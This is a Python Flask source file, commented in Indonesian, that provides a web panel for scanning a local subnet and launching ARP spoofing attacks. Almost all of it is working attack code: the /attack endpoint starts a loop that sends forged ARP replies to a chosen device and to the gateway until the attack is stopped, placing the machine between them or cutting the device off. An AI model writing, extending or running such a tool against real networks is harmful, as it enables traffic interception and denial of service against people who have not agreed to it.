from flask import Flask, render_template, request, jsonify
from scapy.all import ARP, Ether, srp, send, conf
import threading
import time
import socket
import os
import subprocess

app = Flask(__name__)

# --- KONFIGURASI JARINGAN ---
# GANTI dengan GUID interface Anda yang punya IP 192.168.1.x
conf.iface = r"\Device\NPF_{BAC1A529-DE4F-449B-AF39-6C37D774AC8F}" 

IP_RANGE = "192.168.1.0/24" 
GATEWAY_IP = "192.168.1.1" 

active_attacks = {}

def get_local_ip_mac():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return {'ip': local_ip, 'mac': 'Host Anda (Laptop)'}

def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        if ans: return ans[0][1].hwsrc
    except: return None
    return None

def spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def spoof_loop(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    while active_attacks.get(target_ip):
        if target_mac and gateway_mac:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
        time.sleep(2)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['GET'])
def scan():
    try:
        subnet = "192.168.1"
        def ping_all():
            for i in range(1, 255):
                os.system(f"ping -n 1 -w 50 {subnet}.{i} > nul")
        
        threading.Thread(target=ping_all).start()
        time.sleep(4)
        devices = [get_local_ip_mac()]
        result = subprocess.check_output("arp -a", shell=True).decode()
        
        for line in result.splitlines():
            if "dynamic" in line or "static" in line:
                parts = line.split()
                if len(parts) >= 3:
                    ip = parts[0]
                    mac = parts[1]
                    if ip.startswith(subnet):
                        devices.append({'ip': ip, 'mac': mac})
                        
        return jsonify(devices)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/attack', methods=['POST'])
def attack():
    data = request.json
    target_ip = data['ip']
    active_attacks[target_ip] = True
    threading.Thread(target=spoof_loop, args=(target_ip, GATEWAY_IP), daemon=True).start()
    return jsonify({"status": "Attacking " + target_ip})

@app.route('/stop', methods=['POST'])
def stop():
    data = request.json
    target_ip = data['ip']
    active_attacks[target_ip] = False
    return jsonify({"status": "Stopped"})

if __name__ == '__main__':
    app.run(debug=True, port=5000)